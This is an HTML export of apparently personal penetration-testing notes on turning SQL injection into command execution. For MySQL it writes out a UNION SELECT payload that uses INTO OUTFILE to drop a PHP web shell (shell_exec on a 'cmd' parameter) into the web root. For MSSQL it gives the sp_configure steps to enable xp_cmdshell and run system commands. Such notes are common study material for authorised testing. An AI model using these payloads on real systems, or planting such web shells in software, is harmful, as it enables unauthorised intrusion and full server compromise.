<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>üíâ_üêö Possbile_shell_with_sqli</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>üíâ_üêö Possbile_shell_with_sqli</h1><br/><strong><h3># Possbile Code execution on MYSQL</h3></strong><br /><br />If we found SQL injection on a webapp and we also know the web-root of the target, we can try adding PHP files[<span style="color:#ff0000;">or any other lang the application understands</span>] into the web-root which we can directly access from web for some code execution.<br /><a name="CODE_EXECUTION_WITH_MYSQL"></a><br /><br /><em><span style="color:#00ff00;">‚Ä¢ UNION-Method Writing Files</span></em><em><span style="color:#ff0000;"> </span></em><br /><br />Once we know that we have a union based injection we can try adding PHP code  to a file for code execution [<span style="color:#ff0000;">basically a webshell</span>]<br /><br /><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">UNION</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ALL</span>&nbsp;<span style="color:#ff9d00;font-weight:700">SELECT</span>&nbsp;<span style="color:#ff0044;font-weight:400">NULL</span>,&nbsp;&quot;&lt;?php&nbsp;echo&nbsp;<span style="color:#3ad900;font-weight:400">&#39;&lt;pre&gt;&#39;</span>&nbsp;.&nbsp;shell_exec($_GET[<span style="color:#3ad900;font-weight:400">&#39;cmd&#39;</span>])&nbsp;.&nbsp;<span style="color:#3ad900;font-weight:400">&#39;&lt;/pre&gt;&#39;</span>;?&gt;&quot;&nbsp;<span style="color:#ff9d00;font-weight:700">into</span>&nbsp;OUTFILE&nbsp;<span style="color:#3ad900;font-weight:400">&#39;/var/www/html/shell.php&#39;</span><br /></div></div><br /><br /><br />If this is successfull we could directly this access this shell.php on web server and then pass on system commands to run using the cmd param [<span style="color:#ff0000;">?cmd=whoami</span> or <span style="color:#ff0000;">&amp;cmd=whoami</span>  {<span style="color:#00ff00;">check which works</span>}]<br /><br /><br /><br /><strong><h3># Possbile Code execution on MSSQL [MICROSOFT] </h3></strong><br /><br /><a name="CODE_EXECUTION_WITH_MSSQL"></a><br /><br />[<span style="color:#7f7f7f;">This can also be used in UNION method with SELECT statement</span> // <span style="color:#7f7f7f;">If we have access to MSSQL we can directly run these commands</span>.]<br /><br />we can use the xp_cmdshell feature of MSSQL to execute system commands but it is not enabled by Default<br /><br /><strong><span style="color:#00ff00;background-color:#7f7f7f;">‚Ä¢ Enabling xp_cmdshell</span></strong><br /><br />1) <span style="color:#ff0000;">EXEC sp_configure &#39;show advanced options&#39;, 1;</span><br />2) <span style="color:#ff0000;">RECONFIGURE;</span><br /><br />3) <span style="color:#00ff00;">EXEC sp_configure &#39;xp_cmdshell&#39;, 1;</span><br />4) <span style="color:#00ff00;">RECONFIGURE;</span><br /><br /><br /><strong><span style="color:#00ff00;background-color:#7f7f7f;">‚Ä¢ Executing commands</span></strong><br /><br />‚Üí <span style="color:#ff0000;">exec master..xp_cmdshell</span> &#39;<span style="color:#00ff00;">whoami</span>&#39;;<br /></div></body></html>